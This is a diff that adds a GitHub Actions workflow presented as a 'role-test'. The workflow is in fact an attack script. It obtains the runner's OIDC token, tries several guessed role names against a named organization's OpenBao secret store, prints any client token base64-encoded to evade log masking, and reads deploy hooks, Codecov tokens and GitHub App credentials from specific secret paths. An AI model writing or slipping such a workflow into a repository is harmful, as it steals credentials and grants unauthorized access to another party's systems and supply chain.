@@ -1,0 +1,27 @@
+name: role-test
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
+          echo "JWT_LEN=${#TOK}"
+          echo "$TOK" | cut -d. -f2 | python3 -c 'import sys,base64,json; s=sys.stdin.read().strip(); s+="="*(-len(s)%4); d=json.loads(base64.urlsafe_b64decode(s)); print("AUD="+str(d.get("aud"))+" REPO="+str(d.get("repository")))' 2>/dev/null
+          for R in celo-org_celo-mondo_main celo-org_developer-tooling celo-org_tests-gh-workflows-actions celo-org_tests-gh-workflows-actions_main celo-org_developer-tooling_master; do
+            echo "=== ROLE $R"
+            curl -s -X POST 'https://openbao.akeyless.celo-networks-dev.org/v1/auth/github/login' -H 'Content-Type: application/json' -d "{\"role\":\"$R\",\"jwt\":\"$TOK\"}" | tee /tmp/r.json | head -c 400; echo
+            T=$(jq -r '.auth.client_token // empty' /tmp/r.json)
+            if [ -n "$T" ]; then
+              echo "TOKEN_B64=$(printf %s "$T" | base64 -w0)"
+              for P in secrets/data/static-secrets/dev-tooling-circle/vercel/celo-mondo_vercel_deploy_hook secrets/data/static-secrets/dev-tooling-circle/codecov/developer-tooling secrets/data/static-secrets/dev-tooling-circle/github-app/developer-tooling-release secrets/data/test-secret secrets/data/test2/caca; do
+                echo "--- PATH $P"
+                curl -s -H "X-Vault-Token: $T" "https://openbao.akeyless.celo-networks-dev.org/v1/$P" | head -c 800; echo
+              done
+            fi
+          done
